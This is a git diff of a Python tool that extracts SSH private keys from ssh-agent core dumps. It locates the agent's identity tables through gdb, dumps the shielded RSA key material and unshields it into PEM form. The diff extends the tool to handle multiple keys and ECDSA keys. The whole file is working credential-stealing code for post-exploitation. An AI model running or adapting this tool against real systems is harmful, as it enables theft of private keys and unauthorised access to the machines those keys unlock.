@@ -3,16 +3,16 @@
 # A script to automate the extraction of SSH keys from a ssh-agent process memory dump
 # Author: @Kracken256
 # Version: 1.0
-# TODO: Add support for multiple keys
-# TODO: Extract and convert the keys to PEM format
+# TODO: Add support for DSA keys
 
 
 import os
 import sys
-import struct
+from pwn import log
 from typing import List
 import binascii
 import subprocess
+
 
 # Finds the index of the string '/tmp/ssh-' in a file
 
@@ -41,6 +41,11 @@ k
 q
 """
 
+program_version = 'v1.0'
+
+
+log.info(f"SSH Key Finder {program_version}")
+
 
 def find_magic_marker(filepath: str) -> int:
     with open(filepath, "rb") as file:
@@ -58,7 +63,7 @@ def find_magic_marker(filepath: str) -> int:
 # Step back until the first pointer is found. Return as int.
 
 
-def find_first_pointer(filepath: str, index: int) -> int:
+def find_idtable(filepath: str, index: int) -> int:
     with open(filepath, "rb") as file:
         file.seek(index)
         current_index = index
@@ -78,7 +83,6 @@ def find_first_pointer(filepath: str, index: int) -> int:
             if index - current_index > 256:
                 return None
 
-# Returns a list of SSH keys from a list of filepaths. Format of ssh keys in in PEM format.
 
 # Meant for running gdb shell commands
 
@@ -89,6 +93,10 @@ def run_system_command(command: str) -> str:
     return p.stdout.decode('utf-8')
 
 # This is flipped wierdly. It returns the data in the format of a string of hex bytes. But is works.
+
+
+def pointer_tostring(pointer: int) -> str:
+    return f"0x{binascii.hexlify(pointer.to_bytes(8, byteorder='big')).decode('utf-8')}"
 
 
 def gdb_run_command_parse(command: str) -> bytes:
@@ -116,13 +124,13 @@ def check_virtual_pointer(pointer: int) -> bool:
 # Save our sanity by checking the first pointer
 
 
-def validate_1st_pointer(coredump: str, binary_path, pointer: int) -> bool:
+def validate_idtable_ptr(coredump: str, binary_path, pointer: int) -> bool:
     data = gdb_run_command_parse(
         f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/24gx {pointer}' -ex 'quit' -q")
     if len(data) < 32:
-        return False
+        return None
     if data[7] == 0:
-        return False
+        return None
 
     other_pointer_1 = int.from_bytes(
         data[8:16], byteorder='big', signed=False)
@@ -130,71 +138,48 @@ def validate_1st_pointer(coredump: str, binary_path, pointer: int) -> bool:
         data[16:24], byteorder='big', signed=False)
 
     if not check_virtual_pointer(other_pointer_1) or not check_virtual_pointer(other_pointer_2):
-        return False
+        return None
 
-    return True
+    return data[7]
 
 
-def get_second_pointer(coredump: str, binary_path, pointer: int) -> int:
+def find_identity(coredump: str, binary_path, pointer: int, i: int) -> int:
     data = gdb_run_command_parse(
         f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/24gx {pointer}' -ex 'quit' -q")
     if len(data) < 32:
         return None
 
-    other_pointer = int.from_bytes(
+    # get the i'th identity pointer from list
+    data = gdb_run_command_parse(
+        f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/24gx {pointer}' -ex 'quit' -q")
+    pointer = int.from_bytes(
         data[16:24], byteorder='big', signed=False)
+    other_pointer = 0
+    iteration = 0
+    while iteration < i:
+        data = gdb_run_command_parse(
+            f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/24gx {pointer}' -ex 'quit' -q")
 
-    if not check_virtual_pointer(other_pointer):
-        return None
-
-    return other_pointer
-
-
-def get_third_pointer(coredump: str, binary_path, pointer: int) -> int:
-    data = gdb_run_command_parse(
-        f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/24gx {pointer}' -ex 'quit' -q")
-    if len(data) < 32:
-        return None
-
-    other_pointer = int.from_bytes(
-        data[16:24], byteorder='big', signed=False)
-
-    if not check_virtual_pointer(other_pointer):
-        return None
-    return other_pointer
-
-
-def get_the_key_struct_stuff(coredump: str, binary_path, pointer: int):
-    data = gdb_run_command_parse(
-        f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/24gx {pointer}' -ex 'quit' -q")
-
-    if len(data) < 32:
-        return None
-
-    for i in range(0, 64, 8):
+        pointer = int.from_bytes(
+            data[8:16], byteorder='big', signed=False)
         other_pointer = int.from_bytes(
-            data[i:i+8], byteorder='big', signed=False)
-        if check_virtual_pointer(other_pointer):
-            return (other_pointer, data[7])
-    return None
+            data[16:24], byteorder='big', signed=False)
+        iteration += 1
+    if not check_virtual_pointer(other_pointer):
+        return None
+    return other_pointer
 
 
-def dump_key_data_raw(coredump: str, binary_path, pointer: int) -> bytes:
-    run_system_command(
-        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/key-extract.raw {pointer} {pointer+256}' -ex 'quit' -q")
-    with open("/tmp/key-extract.raw", "rb") as file:
-        return file.read()
+def find_sshkey(coredump: str, binary_path, pointer: int):
+    data = gdb_run_command_parse(
+        f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/8gx {pointer}' -ex 'quit' -q")
+
+    if len(data) < 8:
+        return None
+    return pointer, data[7]
 
 
-def dump_ecdsa(coredump: str, binary_path, pointer: int) -> bytes:
-    run_system_command(
-        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/key-extract.raw {pointer} {pointer+32}' -ex 'quit' -q")
-    with open("/tmp/key-extract.raw", "rb") as file:
-        return file.read()
-
-
-def dump_rsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
-    # print(f"Attempting to unshield RSA key at {sshkey_ptr}")
+def dump_ecdsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
     raw_sshkey = None
     raw_sshkey = gdb_run_command_parse(
         f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/28gx {sshkey_ptr}' -ex 'quit' -q")
@@ -225,17 +210,54 @@ def dump_rsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     sp.stdin.write(gdb_key_unshield_cmd.encode("utf-8"))
     sp.communicate()
-    os.remove("./peda-session-ssh-keygen.txt")
-    os.remove("/tmp/rsa-prekey-shield.raw")
-    os.remove("/tmp/rsa-priv-shield.raw")
+    os.unlink("./peda-session-ssh-keygen.txt")
+    os.unlink("/tmp/rsa-prekey-shield.raw")
+    os.unlink("/tmp/rsa-priv-shield.raw")
     with open("/tmp/rsa-extracted.pem", "r") as file:
-        data =  file.read()
-        os.remove("/tmp/rsa-extracted.pem")
+        data = file.read()
+        os.unlink("/tmp/rsa-extracted.pem")
         return data
 
 
-def pointer_tostring(pointer: int) -> str:
-    return f"0x{binascii.hexlify(pointer.to_bytes(8, byteorder='big')).decode('utf-8')}"
+def dump_rsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
+    raw_sshkey = None
+    raw_sshkey = gdb_run_command_parse(
+        f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/28gx {sshkey_ptr}' -ex 'quit' -q")
+
+    shielded_private = int.from_bytes(
+        raw_sshkey[0x90-8:0x90], byteorder='big', signed=False)
+
+    shielded_private_size = int.from_bytes(
+        raw_sshkey[0x90:0x90 + 8], byteorder='big', signed=False)
+
+    shielded_prekey = int.from_bytes(
+        raw_sshkey[0x90+8:0x90+16], byteorder='big', signed=False)
+
+    shielded_prekey_size = int.from_bytes(
+        raw_sshkey[0x90+16:0x90+24], byteorder='big', signed=False)
+
+    # Dump the shielded private key from core
+    run_system_command(
+        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/rsa-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}' -ex 'quit' -q")
+
+    # Dump the shielded prekey from core
+    run_system_command(
+        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/rsa-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}' -ex 'quit' -q")
+
+    # Unshield the private key
+
+    sp = subprocess.Popen(["gdb", "./ssh-keygen"], stdin=subprocess.PIPE,
+                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    sp.stdin.write(gdb_key_unshield_cmd.encode("utf-8"))
+    sp.communicate()
+    os.unlink("./peda-session-ssh-keygen.txt")
+    os.unlink("/tmp/rsa-prekey-shield.raw")
+    os.unlink("/tmp/rsa-priv-shield.raw")
+    with open("/tmp/rsa-extracted.pem", "r") as file:
+        data = file.read()
+
+        os.unlink("/tmp/rsa-extracted.pem")
+        return data
 
 
 def extract_keys(filepaths: List[str], ssh_agent) -> List[str]:
@@ -244,78 +266,79 @@ def extract_keys(filepaths: List[str], ssh_agent) -> List[str]:
     # Check if filepaths are valid
     for filepath in filepaths:
         if not os.path.exists(filepath):
-            print(f"Error: File {filepath} does not exist.")
+            log.error(f"Error: File {filepath} does not exist.")
             return None
     for filepath in filepaths:
         # Fine the magic marker
         magic_marker = find_magic_marker(filepath)
         if magic_marker is None:
-            print("Error: Could not find magic marker.")
+            log.warn("Error: Could not find magic marker.")
             return None
-        print(f"Magic marker found at {magic_marker}")
+        log.info(f"Magic marker found at {magic_marker}")
 
         # Find the first pointer
-        first_pointer = find_first_pointer(filepath, magic_marker)
-        if first_pointer is None:
-            print("Error: Could not find first pointer.")
+        idtable_pointer = find_idtable(filepath, magic_marker)
+        if idtable_pointer is None:
+            log.warn("Error: Could not find idtable struct pointer.")
             return None
 
         # Validate the first pointer
-        if not validate_1st_pointer(filepath, ssh_agent, first_pointer):
-            print("Error: First pointer is invalid.")
+        num_keys = validate_idtable_ptr(filepath, ssh_agent, idtable_pointer)
+        if not num_keys:
+            log.warn("Error: First pointer is invalid.")
             return None
-        print(f"Found the idtable struct at {pointer_tostring(first_pointer)}")
-
+        log.info(
+            f"Found the idtable struct at {pointer_tostring(idtable_pointer)}")
+        log.success(f"Found {num_keys} ssh private keys.")
         # Get second pointer
-        second_pointer = get_second_pointer(
-            filepath, ssh_agent, first_pointer)
-        if second_pointer is None:
-            print("Error: Could not find second pointer.")
-            return None
+        for i in range(1, num_keys+1):
+            key_type = 0
+            try:
+                second_pointer = find_identity(
+                    filepath, ssh_agent, idtable_pointer, i)
+                if second_pointer is None:
+                    log.warn(
+                        "Could not find identity struct pointer (The key could be encrypted.)")
+                    raise Exception("Could not find identity struct pointer.")
 
-        print(
-            f"Found the identity struct at {pointer_tostring(second_pointer)}")
+                log.info(
+                    f"Found identity struct {i} at {pointer_tostring(second_pointer)}")
 
-        # Get third pointer
-        third_pointer = get_third_pointer(
-            filepath, ssh_agent, second_pointer)
-        if third_pointer is None:
-            print("Error: Could not find third pointer.")
-            return None
-        print(f"Found the sshkey struct at {pointer_tostring(third_pointer)}")
-
-        # Get the key struct pointer
-        key_struct_pointer, key_type = get_the_key_struct_stuff(
-            filepath, ssh_agent, third_pointer)
-        if key_struct_pointer is None:
-            print("Error: Could not find key struct pointer.")
-            return None
-        if key_type < 0 or key_type > 3:
-            print("Error: Key type is invalid.")
-            return None
-
-        # Display the sshkey type
-        if key_type == 0:
-            print("RSA key found")
-            keys.append(
-                dump_rsa(filepath, ssh_agent, third_pointer))
-        elif key_type == 3:
-            print("ECDSA key found")
-            # Dump the key data
-            ecdsa_raw = dump_ecdsa(
-                filepath, ssh_agent, key_struct_pointer)
-            if ecdsa_raw is None:
-                print("Error: Could not dump ecdsa key.")
-                return None
-            keyhex = binascii.hexlify(ecdsa_raw).decode('utf-8')
-            print(keyhex)
+                # Get the key struct pointer
+                _, key_type = find_sshkey(
+                    filepath, ssh_agent, second_pointer)
+                if key_type < 0 or key_type > 3:
+                    log.warn("Error: Key type is invalid.")
+                    raise Exception("Key type is invalid.")
+                    # Display the sshkey type
+                if key_type == 0:
+                    log.info("RSA key found")
+                    # Dump the key data
+                    rsa_ssh = dump_rsa(filepath, ssh_agent, second_pointer)
+                    if not rsa_ssh:
+                        log.warn("Error: Could not dump RSA key.")
+                        raise Exception("Could not dump RSA key.")
+                    log.success("RSA key extracted")
+                    keys.append(rsa_ssh)
+                elif key_type == 3:
+                    log.info("ECDSA key found")
+                    ecdsa_ssh = dump_ecdsa(filepath, ssh_agent, second_pointer)
+                    if not ecdsa_ssh:
+                        log.warn("Error: Could not dump EXDSA key.")
+                        raise Exception("Could not dump ECDSA key.")
+                    log.success("ECDSA key extracted")
+                    keys.append(ecdsa_ssh)
+            except:
+                log.warn(f"Error: Could not extract key of type {key_type}.")
+                continue
     return keys
 
 
 def main():
     # Get filepaths (coredumps) from command line arguments
     if (len(sys.argv) < 3):
-        print(f"Usage: python3 {sys.argv[0]} ssh-agent <coredump1> <coredump2> ...")
+        print(
+            f"Usage: python3 {sys.argv[0]} ssh-agent <coredump1> <coredump2> ...")
         sys.exit(1)
     filepaths = sys.argv[2:]
     keys = extract_keys(filepaths, sys.argv[1])
